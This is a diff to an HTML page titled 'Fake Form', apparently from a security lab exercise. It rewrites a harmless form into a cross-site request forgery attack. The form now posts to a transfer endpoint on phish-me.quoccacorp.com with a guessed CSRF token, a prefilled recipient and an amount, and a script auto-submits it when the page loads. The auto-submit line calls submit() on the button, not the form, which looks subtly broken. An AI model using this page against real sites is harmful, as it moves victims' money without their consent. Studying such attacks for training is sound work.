@@ -4,14 +4,14 @@
     <title>Fake Form</title>
   </head>
   <body>
-    <form method="POST" action="/api/transfer">
-      <input type="hidden" name="csrf_token" value="MTUzNA==">
-      <input type="text" name="username" placeholder="Username to Send To (can be yourself)">
-      <input type="number" name="amount" placeholder="Amount" step="1">
-      <input type="submit" value="Transfer 💸">
+    <form method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+      <input type="hidden" name="csrf_token" value="MTUzNQ==">
+      <input type="text" name="username" placeholder="Username to Send To (can be yourself)" value="z5264470">
+      <input type="number" name="amount" placeholder="Amount" step="1" value=123>
+      <input id="submit-btn" type="submit" value="Transfer 💸">
   </form>
   <script>
-    alert(1);
+    document.getElementById("submit-btn").submit();
   </script>
   </body>
 </html>
